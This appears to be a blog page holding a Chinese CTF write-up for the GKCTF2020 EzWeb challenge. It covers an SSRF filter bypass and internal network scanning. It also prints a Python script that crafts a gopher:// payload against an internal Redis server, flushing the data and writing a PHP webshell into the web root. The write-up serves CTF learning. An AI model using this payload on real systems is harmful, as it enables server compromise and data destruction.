
<!DOCTYPE html>
<html>
  <head>
    
<meta charset="utf-8" >

<title>[GKCTF2020]EZ三剑客-EzWeb | ev11ccaatt</title>
<meta name="description" content="人菜多学">

<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.min.css">

<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
<link rel="shortcut icon" href="https://ev11ccaatt.github.io/favicon.ico?v=1618116797998">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
<link rel="stylesheet" href="https://ev11ccaatt.github.io/styles/main.css">



<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>



  </head>
  <body>
    <div id="app" class="main">
      <div class="site-header-container">
  <div class="site-header">
    <div class="left">
      <a href="https://ev11ccaatt.github.io">
        <img class="avatar" src="https://ev11ccaatt.github.io/images/avatar.png?v=1618116797998" alt="" width="32px" height="32px">
      </a>
      <a href="https://ev11ccaatt.github.io">
        <h1 class="site-title">ev11ccaatt</h1>
      </a>
    </div>
    <div class="right">
      <transition name="fade">
        <i class="icon" :class="{ 'icon-close-outline': menuVisible, 'icon-menu-outline': !menuVisible }" @click="menuVisible = !menuVisible"></i>
      </transition>
    </div>
  </div>
</div>

<transition name="fade">
  <div class="menu-container" style="display: none;" v-show="menuVisible">
    <div class="menu-list">
      
        
          <a href="/" class="menu purple-link">
            首页
          </a>
        
      
        
          <a href="/archives" class="menu purple-link">
            归档
          </a>
        
      
        
          <a href="https://ev11ccaatt.github.io/post/you-lian/" class="menu purple-link">
            友链
          </a>
        
      
        
          <a href="https://ev11ccaatt.github.io/post/about-me/" class="menu purple-link">
            关于
          </a>
        
      
    </div>
  </div>
</transition>


      <div class="content-container">
        <div class="post-detail">
          
          <h2 class="post-title">[GKCTF2020]EZ三剑客-EzWeb</h2>
          <div class="post-info post-detail-info">
            <span><i class="icon-calendar-outline"></i> 2021-03-30</span>
            
          </div>
          <div class="post-content">
            <p>进去先看源码提示?serect，随便传入试试得到。</p>
<pre><code>eth0 Link encap:Ethernet HWaddr 02:42:0a:00:7f:09 inet addr:10.0.127.9 Bcast:10.0.127.255 Mask:255.255.255.0 UP BROADCAST RUNNING MULTICAST MTU:1450 Metric:1 RX packets:51 errors:0 dropped:0 overruns:0 frame:0 TX packets:48 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:11820 (11.8 KB) TX bytes:9298 (9.2 KB) eth1 Link encap:Ethernet HWaddr 52:54:00:9b:70:fe inet addr:10.128.0.92 Bcast:10.128.255.255 Mask:255.255.0.0 UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1 RX packets:4 errors:0 dropped:0 overruns:0 frame:0 TX packets:17 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:0 RX bytes:196 (196.0 B) TX bytes:1194 (1.1 KB) lo Link encap:Local Loopback inet addr:127.0.0.1 Mask:255.0.0.0 UP LOOPBACK RUNNING MTU:65536 Metric:1 RX packets:30 errors:0 dropped:0 overruns:0 frame:0 TX packets:30 errors:0 dropped:0 overruns:0 carrier:0 collisions:0 txqueuelen:1000 RX bytes:2596 (2.5 KB) TX bytes:2596 (2.5 KB)
</code></pre>
<p>带ip，那么可能就是个ssrf,先看下源码，用file去读.</p>
<p>但file:///var%2Fwww%2Fhtml%2Findex.php&amp;submit=%E6%8F%90%E4%BA%A4 被过滤,试试file:/var和</p>
<p>file: ///var来绕过,都成功了.</p>
<pre><code>&lt;?php
function curl($url){  
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    echo curl_exec($ch);
    curl_close($ch);
}

if(isset($_GET['submit'])){
		$url = $_GET['url'];
		//echo $url.&quot;\n&quot;;
		if(preg_match('/file\:\/\/|dict|\.\.\/|127.0.0.1|localhost/is', $url,$match))
		{
			//var_dump($match);
			die('别这样');
		}   
		curl($url);
}
if(isset($_GET['secret'])){
	system('ifconfig');
}
?&gt;
</code></pre>
<p>过滤了file，dict，127.0.0.1和localhost。还有http和gopher。</p>
<p>那么先http协议扫描ip，用burp配合扫描，得到10.0.127.11是有提示的。而ssrf通常是对6379端口的redis进行攻击.<br>
扫到10.0.127.11:6379是存在服务的.<br>
然后用gopher来写shell。</p>
<pre><code>vimport urllib
protocol=&quot;gopher://&quot;
ip=&quot;10.0.127.11&quot;      // 运行有redis的主机ip
port=&quot;6379&quot;
shell=&quot;\n\n&lt;?php system(\&quot;cat /flag\&quot;);?&gt;\n\n&quot;
filename=&quot;shell.php&quot;
path=&quot;/var/www/html&quot;
passwd=&quot;&quot;
cmd=[&quot;flushall&quot;,
	 &quot;set 1 {}&quot;.format(shell.replace(&quot; &quot;,&quot;${IFS}&quot;)),
	 &quot;config set dir {}&quot;.format(path),
	 &quot;config set dbfilename {}&quot;.format(filename),
	 &quot;save&quot;
	 ]
if passwd:
	cmd.insert(0,&quot;AUTH {}&quot;.format(passwd))
payload=protocol+ip+&quot;:&quot;+port+&quot;/_&quot;
def redis_format(arr):
	CRLF=&quot;\r\n&quot;
	redis_arr = arr.split(&quot; &quot;)
	cmd=&quot;&quot;
	cmd+=&quot;*&quot;+str(len(redis_arr))
	for x in redis_arr:
		cmd+=CRLF+&quot;$&quot;+str(len((x.replace(&quot;${IFS}&quot;,&quot; &quot;))))+CRLF+x.replace(&quot;${IFS}&quot;,&quot; &quot;)
	cmd+=CRLF
	return cmd

if __name__==&quot;__main__&quot;:
	for x in cmd:
		payload += urllib.quote(redis_format(x))
	print payload
来自互联网
</code></pre>
<p>在栏中输入payload（这里我等了一会，就直接burp发了)</p>
<p>随后访问http://10.0.127.11/shell.php</p>
<p>得到flag.</p>

          </div>
        </div>

        
          <div class="next-post">
            <a class="purple-link" href="https://ev11ccaatt.github.io/post/gkctf2020checkin/">
              <h3 class="post-title">
                下一篇：[GKCTF2020]CheckIN
              </h3>
            </a>
          </div>
          
      </div>

      

      <div class="site-footer">
  <div class="slogan">人菜多学</div>
  <div class="social-container">
    
      
    
      
    
      
    
      
    
      
    
  </div>
  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://ev11ccaatt.github.io/atom.xml" target="_blank">RSS</a>
</div>


    </div>
    <script type="application/javascript">

hljs.initHighlightingOnLoad()

var app = new Vue({
  el: '#app',
  data: {
    menuVisible: false,
  },
})

</script>




  </body>
</html>
